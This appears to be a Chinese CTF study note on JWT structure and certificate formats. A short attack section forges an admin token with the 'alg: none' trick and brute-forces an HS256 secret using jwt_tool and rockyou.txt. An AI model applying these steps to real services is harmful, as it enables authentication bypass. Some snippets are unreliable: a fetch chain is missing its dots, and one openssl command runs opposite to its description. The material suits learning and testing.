---
title: Certification
date: 2025-07-16 06:23:24
tags: []
---

# JWT（JSON Web Tokens）
JavaScript 对象签名和加密 (JOSE) 是一个框架，指定了在 Internet
上安全传输信息的方式。它最著名的是 JSON Web 令牌
(JWT)，用于在网站或应用程序上对自己进行授权。JWT
通常在您通过输入用户名和密码对自己进行身份验证后，通过在浏览器中存储您的“登录会话”来做到这一点。换句话说，网站会为您提供包含您的用户
ID 的 JWT，可以将其呈现给网站以证明您是谁，而无需再次登录。JWT
看起来是这样的：

eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJmbGFnIjoiY3J5cHRve2p3dF9jb250ZW50c19jYW5fYmVfZWFzaWx5X3ZpZXdlZH0iLCJ1c2VyIjoiQ3J5cHRvIE1jSGFjayIsImV4cCI6MjAwNTAzMzQ5M30.shKSmZfgGVvd2OSB2CGezzJ3N6WAULo3w9zCl_T47KQ

你可以识别它，因为它是被分割成三个部分（由.分隔）的base64编码数据：报头、有效载荷和签名。实际上，这是一种base64编码的变体，其中的+和/已经被不同的特殊字符替换，因为它们可能会导致URL出现问题。一些开发人员认为JWT编码就像加密一样，所以他们将敏感数据放入token中，但是这是错误的

diagram showing JWT usage传统的会话存储方式是使用会话ID
cookie。在您登录网站后，后端（服务器）会为您创建一个会话对象，而您的浏览器（客户端）则会得到一个标识该对象的cookie。当您向网站发送请求时，您的浏览器会自动将会话ID
cookie发送到后端服务器，后端服务器使用该ID在自己的内存中找到您的会话，从而授权您执行操作。JWT的工作方式不同。登录后，服务器会将整个会话对象以JWT的形式发送到您的网络浏览器，其中包含描述您的用户名、权限和其他信息的键值对的负载。其中还包括使用服务器的私钥创建的签名，旨在防止您篡改负载。您的网络浏览器会将token保存到本地存储中。

JWT（JSON Web Token）
是一种用于认证和信息交换的紧凑型令牌，通常通过 HTTP 请求头中的
Authorization 字段传递。

示例：在请求头中添加 JWT

以下是如何将 JWT 添加到 HTTP 请求头的示例：

```
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
// 使用 Fetch API 发送带有 JWT 的请求

const token = "your-jwt-token";

fetch("https://api.example.com/protected-resource", {

method: "GET",

headers: {

"Authorization": `Bearer ${token}`, // 将 JWT 放入 Authorization 字段

"Content-Type": "application/json"

}

})

then(response => response.json())

then(data => console.log(data))

catch(error => console.error("Error:", error));
```

## JWT构成
　　JWT就是一段字符串，由三段base64URL编码构成，将这三段信息文本用
.链接一起就构成了Jwt字符串。

```
1
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ
```

### 1.Header
Let's look at JWT algorithms. The first part of a JWT is the JOSE
header, and when you decode it, looks like this:

{"typ":"JWT","alg":"HS256"}

注意这里如果顺序相反，得到的签名是不一样的，比如alg放前面

所以如果和题目生成的不一样，加个sort_headers

```
1
encoded = jwt.encode({'username': username, 'admin': False}, SECRET_KEY, algorithm='HS256',sort_headers=False)
```

但注意，如果alg被篡改成“none"，那么就无需验证签名了！

# JWT attack
## 1.None攻击
将header中的alg改成none，然后签名随便就行了

```
1
2
3
4
session = {'username': 'admin', 'admin': True}
token = jwt.encode(session,key=None,algorithm="none")
print(token)
#eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwiYWRtaW4iOnRydWV9.
```

第二个点后面没东西，随便填个123都行

## 2.使用jwt_tool爆破HS256密钥
```
1
python jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiYWRtaW4iOmZhbHNlfQ.-Rn2Yjl7gjPxDf2SIkyo_76iR_Yp-dA-E500-kS95NE -C -d rockyou.txt      
```

C:/.jwt_tool/jwtconf.ini Original JWT:

[+] secret is the CORRECT key! You can tamper/fuzz the token contents
(-T/-I) and sign it using: python3 jwt_tool.py [options here] -S hs256
-p "secret"

# 数字证书格式
## PEM
PEM 以 -----BEGIN 开头，以 -----END
结尾，中间包含 ASN.1 格式的数据。ASN.1 是经过 base64
转码的二进制数据。Wikipedia
上有完整 PEM 文件的例子。

用 Python 3 和 PyCryptodome 库可以与 PEM
文件交互并提取相关数据。例如我们想提取出模数 n：

```
1
2
3
4
5
6
#!/usr/bin/env python3
from Crypto.PublicKey import RSA

with open("certificate.pem","r") as f:
    key = RSA.import_key(f.read())
    print(key.n)
```

## DER
DER 是 ASN.1 类型的二进制编码。后缀 .cer 或
.crt 的证书通常包含 DER 格式的数据，但 Windows 也可能会接受
PEM 格式的数据。

我们可以用 openssl 将 PEM 文件转化为 DER 文件：

```
1
openssl x509 -inform DER -in certificate.der > certificate.pem
```

现在问题被简化成了如何读取 PEM 文件，所以我们可以重复使用上一小节中的
Python 代码。

## 其他格式转换
```
1
2
openssl x509 -outform der -in certificate.pem -out certificate.der
openssl x509 -inform der -in certificate.cer -out certificate.pem
```

## Web  ## PWN